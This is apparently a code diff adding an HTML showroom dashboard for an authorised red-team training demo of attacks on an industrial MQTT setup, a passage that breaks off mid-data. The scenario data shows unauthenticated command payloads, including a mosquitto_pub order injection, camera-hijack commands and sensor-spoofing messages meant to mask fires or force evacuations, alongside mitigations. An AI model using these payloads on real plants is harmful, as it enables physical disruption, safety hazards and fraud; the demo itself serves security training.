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" alt="NTT DATA">
+      <span class="sep"></span>
+      <span class="tag"><span data-i18n="brand.tag1">Seguridad Ofensiva</span> <strong>·</strong> Training Factory 4.0</span>
+    </div>
+    <div class="headline">
+      <h1 data-i18n="headline.title">Tecnología Operacional · Showroom Red Team</h1>
+      <div class="sub" data-i18n="headline.sub">Demo de ataque en vivo · engagement autorizado</div>
+    </div>
+    <div class="status">
+      <span class="pill"><span class="dot"></span><span data-i18n="status.attack">ATAQUE EN CURSO</span></span>
+      <span class="clock" id="clock">00:00:00</span>
+      <button class="lang-toggle" id="langToggle" aria-label="Language" title="Idioma / Language">
+        <span class="lang-code" id="langCode">ES</span>
+      </button>
+      <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme" title="Tema claro / oscuro">
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="4"/>
+          <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/>
+        </svg>
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79Z"/>
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <!-- SIDEBAR ─ scenario selector -->
+  <aside class="sidebar">
+    <h4 data-i18n="sidebar.header">Escenarios de ataque</h4>
+    <div id="scenarioList"></div>
+    <div class="controls">
+      <div class="row"><span data-i18n="sidebar.navigate">Navegar pasos</span><span><kbd>◀</kbd> <kbd>▶</kbd></span></div>
+    </div>
+  </aside>
+
+  <!-- STAGE ─ center -->
+  <main class="stage">
+    <div class="scenario-hero">
+      <span class="phase-chip" id="scenarioChip">SCENARIO 01</span>
+      <h1 id="scenarioTitle">—</h1>
+      <div class="meta">
+        <div><span data-i18n="hero.target">objetivo</span> <strong id="scenarioTarget">—</strong></div>
+        <div><span data-i18n="hero.protocol">protocolo</span> <strong id="scenarioProto">—</strong></div>
+      </div>
+    </div>
+
+    <div class="killchain">
+      <div class="track"></div>
+      <div class="progress" id="kcProgress"></div>
+      <div class="nodes" id="kcNodes"></div>
+    </div>
+
+    <div class="bottom">
+      <div class="panel">
+        <h4 data-i18n="panel.topology">Topología de red · ruta del kill-chain</h4>
+        <div class="topology" id="topology"></div>
+      </div>
+    </div>
+  </main>
+
+  <!-- IMPACT panel ─ right -->
+  <aside class="impact">
+    <section class="stepcard" id="stepcard">
+      <div class="step-head">
+        <span class="num" id="stepNum">01</span>
+        <span class="phase" id="stepPhase">—</span>
+        <span class="title" id="stepTitle">—</span>
+        <span class="hotkey" id="stepHotkey">—</span>
+        <span class="sev info" id="stepSev">—</span>
+      </div>
+      <div class="gauge" id="gauge"></div>
+    </section>
+
+    <div class="panel-block">
+      <h4 data-i18n="panel.action">Acción</h4>
+      <div class="action-desc" id="stepActionDesc">—</div>
+    </div>
+
+    <div class="panel-block">
+      <h4 data-i18n="panel.narrative">Narrativa del ataque</h4>
+      <div class="narrative" id="stepNarrative">—</div>
+    </div>
+
+    <div class="panel-block effect">
+      <h4 data-i18n="panel.effect">Efecto operativo</h4>
+      <ul class="effect-list" id="stepEffectList"></ul>
+    </div>
+
+    <div class="panel-block chain" id="chainBlock" hidden>
+      <h4 data-i18n="panel.chain">Cadena de ataque</h4>
+      <ul class="chain-list" id="chainList"></ul>
+    </div>
+
+    <div class="mitigations">
+      <h4 data-i18n="panel.mitigations">Mitigaciones (este escenario)</h4>
+      <ul id="mitigationsList"></ul>
+    </div>
+  </aside>
+
+
+</div>
+
+<script>
+/* ============ SCENARIO DATA ============
+   Narratives pulled from D:\Showroom\Demo\MQTT\menu-guide.md,
+   PLC/opcua_attack.py and raspberry/findings-report_raspberry.md
+============================================================== */
+
+const SCENARIOS = {
+  mqtt: {
+    code: 'SC-01',
+    hotkey: '1',
+    title: 'Compromiso del broker MQTT',
+    titleEn: 'MQTT Broker Compromise',
+    target: '192.168.0.10 : 1883',
+    protocol: 'MQTT · plaintext · sin auth',
+    protocolEn: 'MQTT · plaintext · no auth',
+    severity: 'critical',
+    icon: `<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#4A8FC7" stroke-width="1.8" stroke-linecap="round"><path d="M3 13c5 0 9 4 9 9"/><path d="M3 7c9 0 15 6 15 15"/><circle cx="4.5" cy="20.5" r="1.5" fill="#4A8FC7"/></svg>`,
+    findings: ['F-04', 'F-09'],
+    mitigations: [
+      'MQTT sobre TLS (puerto 8883)',
+      'ACLs por cliente + usuario/password',
+      'Segmentación OT/IT con VLANs',
+      'Broker con rate-limiting activado'
+    ],
+    mitigationsEn: [
+      'MQTT over TLS (port 8883)',
+      'Per-client ACLs + username/password',
+      'OT/IT segmentation with VLANs',
+      'Broker with rate-limiting enabled'
+    ],
+    steps: [
+      { phase:'Eavesdrop', hotkey:'[E]', sev:'info', titleEs:'Eavesdrop · sniffing pasivo', titleEn:'Eavesdrop · passive sniffing',
+        narrative:'Sin publicación alguna — pura escucha. Los NIDS basados en publicaciones anómalas ignoran al atacante. En cinco segundos queda trazado el mapa completo del bus: topics activos, frecuencias, esquemas, IDs de pieza, thresholds de visión, versión del firmware. <em>Asimetría brutal</em>: cinco segundos silenciosos a cambio de la inteligencia que sostiene todos los ataques posteriores.',
+        actionDescEs:'Suscripción silenciosa al comodín universal del bus durante cinco segundos, sin publicar un solo byte. Al terminar agrupa los mensajes recibidos por topic y muestra un recuento.',
+        actionDescEn:'Silent subscription to the bus wildcard for five seconds, without publishing a single byte. Groups received messages by topic and prints a tally at the end.',
+        effectEs:{ fisico:'Nada.', operador:'No detectable sin packet-capture en el broker.', downstream:'Todos los ataques posteriores se diseñan sobre este mapa — impacto asimétrico enorme.' },
+        effectEn:{ fisico:'Nothing.', operador:'Undetectable without packet-capture at the broker.', downstream:'Every later attack is designed on top of this map — enormous asymmetric impact.' },
+        action:'subscribe wildcard # · 5 s · 0 bytes TX', channel:'tcp 192.168.0.10:1883 · topic #',
+        payload:'mqtt.subscribe("#")  duration=5s\n# no publica — solo contabiliza por topic\n→ {topic: count} + sample payload',
+        effect:'Mapa completo del bus obtenido. No detectable sin packet-capture.',
+        topology:'attacker→broker',
+        impact:{ threat:25, vars:0, pkts:0, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'SUBSCRIBE', data:'# (wildcard multi-level)', kind:'alert', ts:100 },
+          { topic:'(rx) f/i/state/hbw', data:'{"code":1,"active":false}', ts:200 },
+          { topic:'(rx) i/bme680',      data:'{"t":21.8,"h":45.0,"p":1013}', ts:200 },
+          { topic:'(rx) f/i/stock',     data:'[3 workpieces · A1,B2,C3]', ts:200 }
+        ]
+      },
+      { phase:'Order RGB', hotkey:'[1][2][3]', sev:'info', titleEs:'Orden RED / BLUE / WHITE', titleEn:'Order RED / BLUE / WHITE',
+        narrative:'Para el broker Mosquitto de esta planta, la ERP, la tablet del jefe de turno y un portátil con pinza en un switch OT son <em>indistinguibles</em>. Sin TLS, sin credenciales, sin ACLs por topic. Basta un paquete TCP de 50 bytes contra 192.168.0.10:1883 y la fábrica arranca una orden real que consume una pieza real. No es un exploit — es el propio flujo de negocio ejecutado por alguien que no tenía por qué.',
+        actionDescEs:'Envía un pedido del color elegido al topic de órdenes del bus MQTT. Lanza en el PLC un ciclo completo de producción contra inventario real (HBW → VGR → MPO → SLD → DPS, ~2–3 min).',
+        actionDescEn:'Publishes an order of the chosen color to the MQTT order topic. Triggers a full production cycle on the PLC against real inventory (HBW → VGR → MPO → SLD → DPS, ~2–3 min).',
+        effectEs:{ fisico:'HBW extrae la pieza → VGR transporta → MPO procesa → SLD clasifica → DPS entrega. Ciclo ~2–3 min.', operador:'HMI muestra la orden como IN_PROCESS. Indistinguible de una orden ERP legítima.', downstream:'MES/OEE contabilizan una pieza producida → contabilidad corrupta. Stock físico decrementa por una orden que nunca emitió un humano.' },
+        effectEn:{ fisico:'HBW picks the workpiece → VGR transports → MPO processes → SLD sorts → DPS delivers. ~2–3 min cycle.', operador:'HMI shows the order as IN_PROCESS. Indistinguishable from a legitimate ERP order.', downstream:'MES/OEE count a produced piece → corrupted plant accounting. Physical stock decremented by an order no human ever issued.' },
+        action:'publish × 1 · QoS 0 · retain=false', channel:'f/o/order',
+        payload:'f/o/order  {"type":"RED","ts":"2026-04-22T10:12:03Z"}\n# CLI equivalente:\nmosquitto_pub -h 192.168.0.10 -t f/o/order \\\n  -m \'{"type":"RED","ts":"2026-04-22T10:12:03Z"}\'',
+        effect:'HBW→VGR→MPO→SLD→DPS ciclo completo (~2-3 min). MES contabiliza pieza fraudulenta.',
+        topology:'attacker→broker→plc',
+        impact:{ threat:30, vars:2, pkts:1, stations:['busy','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'f/o/order', data:'{"type":"RED","ts":"2026-04-22T10:12:03Z"}', kind:'alert', ts:150 },
+          { topic:'f/i/state/hbw', data:'{"code":2,"active":true} (PLC response)', ts:400 }
+        ]
+      },
+      { phase:'PTU dance', hotkey:'[4]', sev:'med', titleEs:'PTU dance · cámara señuelo', titleEn:'PTU dance · decoy camera',
+        narrative:'La "cámara" del supervisor remoto es, en el fondo, un topic MQTT. Tomar ese topic equivale a tomar sus ojos. Barrido lateral para distraer, diez segundos apuntando al techo — ventana de oportunidad para mover algo físicamente sin que nadie lo vea — y vuelta al centro. En el parte del turno se escribirá "la cámara se recalibró sola", <em>y nadie cuestionará la frase</em>.',
+        actionDescEs:'Coreografía de tres comandos sobre el topic de la cámara pan-tilt: barrido lateral de distracción, apuntar al techo durante 10–15 s y retorno a la posición central. Mueve físicamente los servos a través del TXT.',
+        actionDescEn:'Three-command choreography on the pan-tilt camera topic: sideways distraction sweep, point at the ceiling for 10–15 s, then return to center. Physically drives the servos through the TXT.',
+        effectEs:{ fisico:'Servos del PTU (TXT 4.0) se mueven realmente. Ruido audible, posición fuera del encuadre normal.', operador:'Durante la ventana oscura, el feed muestra techo/pared — si el HMI rota cámaras automáticamente, nadie sospecha.', downstream:'Análisis por visión (OCR, conteo, detección de PPE) pierde la referencia → falsos negativos durante toda la dance.' },
+        effectEn:{ fisico:'PTU servos (TXT 4.0) physically move. Audible noise, position outside normal framing.', operador:'During the blind window the feed shows ceiling/wall — if the HMI auto-rotates cameras, no one suspects.', downstream:'Vision analytics (OCR, counting, PPE detection) lose the reference → false negatives throughout the dance.' },
+        action:'publish × 3 · relmove_left / relmove_up / home', channel:'o/ptu',
+        payload:'o/ptu  {"cmd":"relmove_left","degree":30,"speed":120}\no/ptu  {"cmd":"relmove_up","degree":45,"speed":80}\no/ptu  {"cmd":"home"}',
+        effect:'Servos del PTU (TXT 4.0) se mueven físicamente. Feed muestra techo durante 10-15 s.',
+        topology:'attacker→broker→txt',
+        impact:{ threat:45, vars:3, pkts:3, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'o/ptu', data:'{"cmd":"relmove_left","degree":30}', kind:'alert', ts:200 },
+          { topic:'o/ptu', data:'{"cmd":"relmove_up","degree":45}', kind:'alert', ts:10000 },
+          { topic:'o/ptu', data:'{"cmd":"home"}', kind:'alert', ts:300 }
+        ]
+      },
+      { phase:'Sensor spoof', hotkey:'[7] [9]', sev:'crit', titleEs:'Sensor spoofing · nominal o alarma', titleEn:'Sensor spoofing · nominal or alarm',
+        narrative:'Dos caras de la misma moneda. <em>Last-writer-wins</em> es la regla del broker: el atacante publica a 800 ms y sepulta al BME680 real. Con <code>[7]</code> la realidad térmica queda oculta bajo un "verde permanente" anómalamente limpio — un incendio real no dispara alarma. Con <code>[9]</code>, el ataque simétrico: 87 °C sostenidos que <em>la fábrica no puede descartar sin subir físicamente</em>. El protocolo EHS obliga a evacuar. Nada se ha roto: quince líneas de Python detienen el turno entero.',
+        actionDescEs:'Hilo en background que publica en el topic del sensor ambiental — <code>[7]</code> lecturas nominales perfectas, <code>[9]</code> valores críticos sostenidos — a 800 ms, por encima de la frecuencia del sensor real.',
+        actionDescEn:'Background thread publishing on the environment-sensor topic — <code>[7]</code> perfect nominal readings, <code>[9]</code> sustained critical values — at 800 ms, faster than the real sensor\'s rate.',
+        effectEs:{ fisico:'El sensor real sigue publicando, pero su señal queda enterrada entre las del atacante.', operador:'[7] dashboard verde permanente anómalamente limpio · [9] alarma roja persistente + protocolo de evacuación activo.', downstream:'Alarmas térmicas falsas o silenciadas. Bomberos, EHS, registro ISO 45001. Avería térmica real invisible.' },
+        effectEn:{ fisico:'The real sensor still publishes, but its signal is buried under the attacker\'s.', operador:'[7] suspiciously clean permanent-green dashboard · [9] persistent red alarm + active evacuation protocol.', downstream:'False or silenced thermal alarms. Firefighters, EHS, ISO 45001 record. Real thermal fault invisible.' },
+        action:'publish loop · 800 ms · daemon thread', channel:'i/bme680',
+        payload:'# [7] Spoof nominal — oculta la realidad térmica\ni/bme680  {"t":22.5,"h":45.0,"p":1013,"iaq":20,"aq":1}\n\n# [9] Spoof ALARM — fabrica la emergencia\ni/bme680  {"t":87.3,"h":8.0,"p":870,"iaq":480,"aq":5}\n# loop hasta stop_event.set()',
+        effect:'Dashboard miente en ambas direcciones. Alarmas nunca disparan (o disparan en falso). Evacuación posible.',
+        topology:'attacker→broker→hmi',
+        impact:{ threat:75, vars:8, pkts:45, stations:['busy','busy','error','idle'], camera:'live' },
+        stream:[
+          { topic:'i/bme680 (spoof)', data:'{"t":22.5,"h":45.0,"aq":1}', kind:'alert', ts:800 },
+          { topic:'i/bme680 (alarm)', data:'{"t":87.3,"h":8.0,"aq":5}', kind:'crit', ts:800 },
+          { topic:'f/i/alert',        data:'HIGH_TEMP_TRIGGERED', kind:'crit', ts:400 }
+        ]
+      },
